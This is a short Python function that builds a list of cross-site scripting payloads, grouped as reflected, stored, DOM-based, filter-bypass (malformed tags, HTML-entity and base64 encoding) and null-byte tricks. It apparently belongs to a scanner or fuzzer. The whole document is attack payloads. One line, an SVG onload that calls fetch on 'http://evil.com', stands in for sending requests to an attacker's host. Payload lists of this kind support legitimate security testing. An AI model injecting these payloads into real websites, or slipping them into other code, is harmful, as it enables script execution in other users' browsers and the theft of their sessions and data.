def generate_payloads():
    payloads = []

    # === Reflected XSS Payloads ===
    payloads += [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
    ]

    # === Stored XSS (simulate storage context) ===
    payloads += [
        "<script>localStorage.setItem('pwned', 1)</script>",
        "<svg/onload=fetch('http://evil.com')>",
        "<iframe srcdoc=\"<script>alert('Stored XSS')</script>\"></iframe>"
    ]

    # === DOM-based XSS Payloads ===
    payloads += [
        "javascript:alert('XSS')",  # for vulnerable href or location
        "#<img src=1 onerror=alert('DOM')>",  # URL fragment injection
        "<input onfocus=alert('DOM') autofocus>",  # DOM interaction
    ]

    # === Bypass Tricks ===
    payloads += [
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",  # malformed tag
        "<svg><script xlink:href='data:text/javascript,alert(1)'></script></svg>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>",  # HTML char codes
        "<a href='javas&#99;ript:alert(1)'>click</a>",  # encoded keyword
        "<math><mi//xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/></math>",
    ]

    # === Null byte / Unicode tricks ===
    payloads += [
        "<script>alert\u0000('XSS')</script>",
        "<img src=x onerror=alert(1)␀>",  # null byte in some contexts
    ]

    return list(set(payloads))  # remove duplicates